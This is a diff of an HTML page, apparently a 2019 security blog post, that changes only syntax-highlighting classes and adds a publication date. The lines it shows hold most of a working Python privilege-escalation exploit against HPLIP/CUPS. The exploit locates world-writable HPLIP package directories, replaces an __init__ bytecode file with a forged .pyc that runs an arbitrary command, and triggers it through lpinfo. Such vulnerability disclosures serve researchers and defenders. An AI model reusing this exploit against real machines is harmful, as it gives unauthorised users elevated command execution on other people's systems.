@@ -150,7 +150,7 @@ installation which has HPLIP and cups running by default, from a user named
 
 <span class="k">def</span> <span class="nf">check_dir</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
     <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isdir</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
-        <span class="k">return</span> <span class="bp">None</span>
+        <span class="k">return</span> <span class="kc">None</span>
 
     <span class="n">pycache_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s2">&quot;__pycache__&quot;</span><span class="p">)</span>
 
@@ -159,7 +159,7 @@ installation which has HPLIP and cups running by default, from a user named
 
     <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">access</span><span class="p">(</span><span class="n">pycache_path</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">W_OK</span><span class="p">):</span>
         <span class="k">return</span> <span class="n">pycache_path</span>
-    <span class="k">return</span> <span class="bp">None</span>
+    <span class="k">return</span> <span class="kc">None</span>
 
 
 <span class="k">def</span> <span class="nf">pyc_compile_file</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
@@ -192,40 +192,40 @@ installation which has HPLIP and cups running by default, from a user named
 
 <span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
     <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
-        <span class="k">print</span><span class="p">(</span><span class="s2">&quot;Usage: </span><span class="si">%s</span><span class="s2"> CMD&quot;</span> <span class="o">%</span> <span class="n">os</span><span class="o">.</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Usage: </span><span class="si">%s</span><span class="s2"> CMD&quot;</span> <span class="o">%</span> <span class="n">os</span><span class="o">.</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
         <span class="k">return</span> <span class="mi">1</span>
 
     <span class="n">cmd</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
 
-    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;[+] Check that /usr/share/hplip/ contains 777 directories&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] Check that /usr/share/hplip/ contains 777 directories&quot;</span><span class="p">)</span>
     <span class="n">vulnerable_dir</span> <span class="o">=</span> <span class="p">(</span><span class="n">check_dir</span><span class="p">(</span><span class="s2">&quot;/usr/share/hplip/prnt&quot;</span><span class="p">)</span> <span class="ow">or</span>
                       <span class="n">check_dir</span><span class="p">(</span><span class="s2">&quot;/usr/share/hplip/base/pexpect&quot;</span><span class="p">))</span>
 
-    <span class="k">if</span> <span class="n">vulnerable_dir</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
-        <span class="k">print</span><span class="p">(</span><span class="s2">&quot;[!] hplip not available or not vulnerable&quot;</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">vulnerable_dir</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[!] hplip not available or not vulnerable&quot;</span><span class="p">)</span>
         <span class="k">return</span> <span class="mi">1</span>
-    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;[-] Found: </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">vulnerable_dir</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[-] Found: </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">vulnerable_dir</span><span class="p">)</span>
 
-    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;[+] Write and compile an __init__.py file&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] Write and compile an __init__.py file&quot;</span><span class="p">)</span>
     <span class="n">init_file_name</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">filename</span>
                             <span class="k">for</span> <span class="n">filename</span> <span class="ow">in</span> <span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="n">vulnerable_dir</span><span class="p">)</span>
                             <span class="k">if</span> <span class="s2">&quot;__init__&quot;</span> <span class="ow">in</span> <span class="n">filename</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
 
     <span class="n">init_file_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">vulnerable_dir</span><span class="p">,</span> <span class="n">init_file_name</span><span class="p">)</span>
 
-    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;[+] Recover the original pyc hash&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] Recover the original pyc hash&quot;</span><span class="p">)</span>
     <span class="n">pyc_hash</span> <span class="o">=</span> <span class="n">pyc_get_hash</span><span class="p">(</span><span class="n">init_file_path</span><span class="p">)</span>
 
-    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;[+] Write the new pyc file in the vulnerable directory&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] Write the new pyc file in the vulnerable directory&quot;</span><span class="p">)</span>
     <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">init_file_path</span><span class="p">)</span>
     <span class="nb">open</span><span class="p">(</span><span class="n">init_file_path</span><span class="p">,</span> <span class="s2">&quot;wb&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">pyc_content</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">pyc_hash</span><span class="p">))</span>
 
-    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;[+] Call lpinfo to list printers and trigger command&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] Call lpinfo to list printers and trigger command&quot;</span><span class="p">)</span>
     <span class="k">if</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">([</span><span class="s2">&quot;lpinfo&quot;</span><span class="p">,</span> <span class="s2">&quot;-v&quot;</span><span class="p">])</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
-        <span class="k">print</span><span class="p">(</span><span class="s2">&quot;[!] lpinfo failed, are you in the 'sys' group?&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[!] lpinfo failed, are you in the 'sys' group?&quot;</span><span class="p">)</span>
         <span class="k">return</span> <span class="mi">1</span>
 
-    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;[+] Success (probably)!&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] Success (probably)!&quot;</span><span class="p">)</span>
     <span class="k">return</span> <span class="mi">0</span>
 
 <span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
@@ -272,7 +272,7 @@ useless: HPLIP automatically changes the rights back to 777.</p>
     </div>
     <footer "class"="site-footer">
       <div "class"="publication_date">
-        First published: 
+        First published: Fri, 6 Dec 2019 18:55:28 +0100
       </div>
     </footer>
   </body>
